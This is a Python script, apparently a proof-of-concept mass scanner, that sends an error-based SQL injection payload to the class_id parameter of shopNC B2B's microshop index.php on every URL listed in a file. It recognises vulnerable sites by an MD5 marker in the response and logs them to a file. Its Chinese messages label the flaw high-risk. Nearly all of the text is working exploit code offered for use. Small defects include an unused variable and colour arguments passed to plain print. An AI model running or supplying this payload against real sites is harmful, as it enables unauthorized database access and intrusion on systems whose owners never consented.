
import json
import requests


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/microshop/index.php?act=personal&class_id[0]=exp&class_id[1]=1)And(Select/**/1/**/From(Select/**/Count(*),Concat((Select(Select(Select/**/Concat(0x7e,Md5(1234),0x7e)))From/**/information_schema.tables/**/limit/**/0,1),Floor(Rand(0)*2))x/**/From/**/Information_schema.tables/**/group/**/by/**/x)a)%23"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在shopNC B2B版 index.php SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在shopnc_index_class_id_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
